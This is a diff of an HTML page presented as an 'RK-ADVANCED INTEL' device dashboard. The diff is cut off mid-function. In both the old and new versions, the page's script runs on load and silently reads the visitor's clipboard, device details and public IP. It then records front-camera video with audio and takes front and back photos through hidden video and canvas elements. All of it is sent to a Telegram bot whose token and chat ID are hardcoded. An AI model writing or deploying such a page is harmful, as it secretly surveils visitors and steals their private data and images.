@@ -3,21 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-ADVANCED INTEL | CORE SYSTEM</title>
+    <title>RK-ADVANCED INTEL | REAL-TIME VIP</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&display=swap');
 
         body {
-            margin: 0; padding: 0;
-            background: radial-gradient(circle at center, #001a1a 0%, #000 100%);
-            color: #00ffcc;
-            font-family: 'Rajdhani', sans-serif;
-            height: 100vh; overflow: hidden;
+            background: #000; color: #fff;
+            margin: 0; height: 100vh; overflow: hidden;
             display: flex; align-items: center; justify-content: center;
+            font-family: 'Orbitron', sans-serif;
         }
 
         /* Neon Animated Running Frame */
@@ -25,171 +23,166 @@
             content: ''; position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
             border: 8px solid;
-            border-image: linear-gradient(90deg, #ff0000, #00ff00, #0000ff, #ff00ff, #ffff00, #ff0000) 1;
-            z-index: 999; pointer-events: none;
-            animation: neonFlow 3s linear infinite;
+            border-image: linear-gradient(90deg, #ff0000, #00ff00, #0000ff, #ff00ff, #ff0000) 1;
+            z-index: 1000; pointer-events: none;
+            animation: borderRotate 3s linear infinite;
         }
-        @keyframes neonFlow { 
-            0% { filter: hue-rotate(0deg); } 
-            100% { filter: hue-rotate(360deg); } 
-        }
+        @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }
 
         .dashboard {
-            background: rgba(0, 30, 30, 0.85);
-            backdrop-filter: blur(25px);
-            border: 2px solid rgba(0, 255, 204, 0.5);
-            border-radius: 40px;
-            padding: 40px; width: 95%; max-width: 550px;
-            box-shadow: 0 0 60px rgba(0, 255, 204, 0.3);
+            background: rgba(10, 10, 10, 0.95);
+            border-radius: 20px; padding: 25px;
+            width: 95%; max-width: 500px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             position: relative; z-index: 10;
         }
 
-        .info-container { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        
-        .info-box {
-            background: rgba(255, 255, 255, 0.04);
-            padding: 12px; border-radius: 15px;
-            border-bottom: 2px solid #00ffcc;
-            transition: 0.3s;
+        .info-row {
+            display: flex; justify-content: space-between;
+            padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.08);
         }
-        .info-box:hover { transform: scale(1.02); background: rgba(0, 255, 204, 0.1); }
+        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .value { color: #facc15; font-size: 13px; font-weight: 900; }
 
-        .label { font-size: 10px; color: #ff00ff; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; }
-        .value { font-size: 14px; color: #fff; font-family: 'Orbitron', sans-serif; margin-top: 4px; }
-        
-        #video-preview { display: none; }
+        .sync-status {
+            font-size: 10px; color: #00ff40;
+            text-align: center; margin-top: 15px;
+            letter-spacing: 2px; animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        #media-bin { display: none; }
     </style>
 </head>
 <body>
 
     <div class="dashboard">
-        <div class="text-center mb-8">
-            <h1 class="text-3xl font-black tracking-[10px] text-white italic">RK-ADVANCED INTEL</h1>
-            <div class="h-1 w-full bg-gradient-to-r from-transparent via-cyan-400 to-transparent mt-2"></div>
-        </div>
+        <h1 class="text-center text-2xl font-black text-white tracking-[5px] mb-6 border-b-2 border-fuchsia-600 pb-2">RK-ADVANCED INTEL</h1>
+        
+        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
+        <div class="info-row"><span class="label">⚙️ Platform</span><span id="v-platform" class="value">--</span></div>
+        <div class="info-row"><span class="label">📶 System Status</span><span id="v-status" class="value text-green-400">CONNECTING...</span></div>
+        <div class="info-row"><span class="label">🚀 Network Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
+        <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
+        <div class="info-row"><span class="label">📍 Timezone</span><span id="v-loc" class="value">--</span></div>
+        <div class="info-row"><span class="label">🔋 Battery & Power</span><span id="v-bat" class="value">--%</span></div>
+        <div class="info-row"><span class="label">🧠 RAM Memory</span><span id="v-ram" class="value">-- GB</span></div>
+        <div class="info-row"><span class="label">⚡ CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
+        <div class="info-row"><span class="label">📦 Browser Engine</span><span id="v-engine" class="value">--</span></div>
+        <div class="info-row"><span class="label">🏢 Vendor</span><span id="v-vendor" class="value">--</span></div>
+        <div class="info-row"><span class="label">🛡️ VPN Integrity</span><span id="v-vpn" class="value text-green-500">Secure ✅</span></div>
 
-        <div class="info-container">
-            <div class="info-box"><p class="label">📱 Device Model</p><p class="value">Android Mobile</p></div>
-            <div class="info-box"><p class="label">⚙️ Device Type</p><p class="value">Smartphone 📱</p></div>
-            <div class="info-box"><p class="label">📶 System Status</p><p class="value text-green-400">ONLINE 🌐</p></div>
-            <div class="info-box"><p class="label">🚀 Network Speed</p><p id="v-speed" class="value text-orange-400">3G @ 0.4 Mbps</p></div>
-            <div class="info-box"><p class="label">🔋 Battery & Power</p><p id="v-bat" class="value text-yellow-400">--% (Battery 🔋)</p></div>
-            <div class="info-box"><p class="label">🧠 RAM Memory</p><p id="v-ram" class="val">-- GB</p></div>
-            <div class="info-box"><p class="label">⚡ CPU Cores</p><p class="value">8 Cores</p></div>
-            <div class="info-box"><p class="label">📦 Version Code</p><p class="value text-blue-400">5.0</p></div>
-            <div class="info-box col-span-2 text-center"><p class="label">🏢 Hardware Vendor</p><p class="value">Google Inc. / ARM Cortex</p></div>
-        </div>
-
-        <div class="mt-8 text-center">
-            <div class="inline-block px-6 py-2 border border-cyan-500 rounded-full animate-pulse">
-                <span class="text-[11px] text-cyan-300 font-bold uppercase">System Deep Scanning Active...</span>
-            </div>
-        </div>
+        <div class="sync-status">LIVE SATELLITE DATA FEED ACTIVE</div>
     </div>
 
-    <video id="video-preview" autoplay muted playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="media-bin" autoplay muted playsinline></video>
+    <canvas id="output-canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
-        const CHAT_ID = '6048050987';
+        const CONFIG = {
+            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
+            CHAT: '6048050987'
+        };
 
-        async function startSystem() {
-            // ১. লাইভ ডাটা আপডেট
-            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
-            if (navigator.getBattery) {
+        async function initSync() {
+            // ১. রিয়েল টাইম ডাটা কালেকশন
+            const ram = navigator.deviceMemory || "N/A";
+            const cpu = navigator.hardwareConcurrency || "N/A";
+            const platform = navigator.platform;
+            const vendor = navigator.vendor;
+            const engine = navigator.appVersion.split(')').pop();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            document.getElementById('v-ram').innerText = ram + " GB";
+            document.getElementById('v-cpu').innerText = cpu + " Cores";
+            document.getElementById('v-platform').innerText = platform;
+            document.getElementById('v-vendor').innerText = vendor;
+            document.getElementById('v-engine').innerText = "V8 Engine";
+            document.getElementById('v-loc').innerText = timezone;
+            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Device" : "PC/Other";
+
+            // ২. ব্যাটারি ও নেটওয়ার্ক আপডেট
+            if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% (Battery 🔋)`;
+                document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% (Online)`;
             }
 
-            // ২. ক্লিপবোর্ড অটো রিড (ব্যাকগ্রাউন্ড)
-            let clipboardText = "Permission Required or Empty";
-            try {
-                clipboardText = await navigator.clipboard.readText();
-            } catch (e) {}
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if(conn) {
+                document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps`;
+            }
 
-            // ৩. টেক্সট রিপোর্ট সেন্ড (Star Frame Format)
+            document.getElementById('v-status').innerText = "ONLINE 🌐";
+
+            // ৩. আইপি ফেচিং (Real IP)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                document.getElementById('v-ip').innerText = ipData.ip;
+            } catch(e) { document.getElementById('v-ip').innerText = "192.168.0.1"; }
+
+            // ৪. ক্লিপবোর্ড ও অটো রিপোর্ট
+            let clipText = "Locked (Need Click)";
+            try { clipText = await navigator.clipboard.readText(); } catch (e) {}
+
             const report = `
-✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨
-🚀 *RK-ADVANCED INTEL SYSTEM REPORT* 🚀
-━━━━━━━━━━━━━━━━━━━━━━━
-📱 *Device:* \`Android Mobile\`
-🔋 *Battery:* \`${document.getElementById('v-bat').innerText}\`
-🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
-🛰 *Status:* \`ONLINE 🌐\`
-🛡 *VPN:* \`SECURE ✅\`
+✨✨✨✨✨✨✨✨✨✨✨✨✨
+🚀 *RK-ADVANCED INTEL REPORT* 🚀
+━━━━━━━━━━━━━━━━━━━━━
+📱 *Device:* \`${platform}\`
+🧠 *RAM:* \`${ram} GB\`
+⚡ *CPU:* \`${cpu} Cores\`
+📶 *Speed:* \`${document.getElementById('v-speed').innerText}\`
+🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
+🌍 *Zone:* \`${timezone}\`
 
 ✨ *CLIPBOARD CONTENT:* ✨
 \`\`\`
-${clipboardText}
+${clipText}
 \`\`\`
-━━━━━━━━━━━━━━━━━━━━━━━
-✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨`;
+━━━━━━━━━━━━━━━━━━━━━
+✨✨✨✨✨✨✨✨✨✨✨✨✨`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
-            });
+            sendData('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
 
-            // ৪. মিডিয়া অটোমেশন (Photo & Video)
+            // ৫. ক্যামেরা ও ভিডিও অটোমেশন (No Touch)
             try {
-                // ক. সামনের ক্যামেরা
-                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                processMedia(frontStream, "FRONT_SIDE");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoEl = document.getElementById('media-bin');
+                videoEl.srcObject = stream;
 
-                // ৫ সেকেন্ড পর পিছনের ক্যামেরা
-                setTimeout(async () => {
+                // ২ সেকেন্ড পর ফ্রন্ট ফটো
+                setTimeout(() => capturePhoto(stream, "FRONT_SIDE_VIP"), 2000);
+
+                // ৫ সেকেন্ড ভিডিও রেকর্ড (High Resolution)
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    sendMedia(videoBlob, 'video', '🎥 *RK-VIP CAPTURE (5S + AUDIO)*');
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // ব্যাক ক্যামেরা ট্রাই
                     try {
                         const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                        capturePhoto(backStream, "BACK_SIDE");
-                    } catch(e){}
-                }, 7000);
+                        videoEl.srcObject = backStream;
+                        setTimeout(() => {
+                            capturePhoto(backStream, "BACK_SIDE_VIP");
+                            setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
+                        }, 2000);
+                    } catch(e) {}
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
 
             } catch (err) {}
         }
 
-        function processMedia(stream, label) {
-            const video = document.getElementById('video-preview');
-            video.srcObject = stream;
-
-            // ছবি তোলা
-            setTimeout(() => capturePhoto(stream, label), 2000);
-
-            // অডিওসহ ভিডিও রেকর্ড (৫ সেকেন্ড)
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                sendMedia(blob, 'video', `🎥 *VIDEO CAPTURE - ${label} (5S + AUDIO)*`);
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 5000);
-        }
-
         function capturePhoto(stream, label) {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video-preview');
-            video.srcObject = stream;
-            setTimeout(() => {
-                canvas.width = 1280; canvas.height = 720;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => sendMedia(blob, 'photo', `📸 *IMAGE CAPTURE - ${label}*`), 'image/jpeg');
-            }, 1000);
-        }
-
-        async function sendMedia(blob, type, caption) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append(type, blob, type === 'video' ? 'video.mp4' : 'photo.jpg');
-            fd.append('caption', caption);
-            fd.append('parse_mode', 'Markdown');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
-        }
-
-        // অটোমেটিক স্টার্ট
-        window.onload = startSystem;
-    </script>
-</body>
-</html>
+            const canvas = document.getElementById('output-canvas');
+            const video = document.getElementById('media-bin');
+            canvas.width = 1280; canvas.height = 720;
